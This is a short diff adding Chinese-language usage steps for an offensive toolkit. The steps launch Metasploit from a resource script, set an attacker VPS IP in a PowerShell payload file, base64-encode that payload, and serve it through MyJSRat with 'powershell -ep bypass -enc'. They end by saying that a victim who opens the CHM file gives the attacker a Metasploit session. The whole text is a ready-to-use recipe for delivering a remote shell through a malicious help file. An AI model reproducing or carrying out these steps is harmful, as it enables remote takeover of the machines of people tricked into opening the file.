@@ -1,0 +1,6 @@
+1.msfconsole -r msf.rc
+2.修改power.txt中的vpsip
+3.cat power.txt | iconv --to-code UTF-16LE |base64
+4.python MyJSRat.py -i vpsip -p 8891 -c "powershell -ep bypass -enc 3中的结果"
+
+5.最后点击CHM文件，就可以得到一个msf会话了
